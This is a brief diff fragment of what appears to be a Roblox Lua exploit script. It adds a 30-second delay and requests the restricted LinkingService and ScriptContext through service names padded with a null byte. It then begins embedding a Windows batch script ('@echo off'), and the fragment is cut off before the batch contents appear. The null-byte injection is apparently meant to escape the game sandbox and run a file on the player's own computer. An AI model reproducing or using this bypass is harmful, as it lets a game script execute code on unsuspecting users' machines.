@@ -1,3 +1,4 @@
+wait(30)
 local LinkingService = game:GetService("LinkingService\0 meow meow meow")
 local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
 local scriptContent = [[@echo off
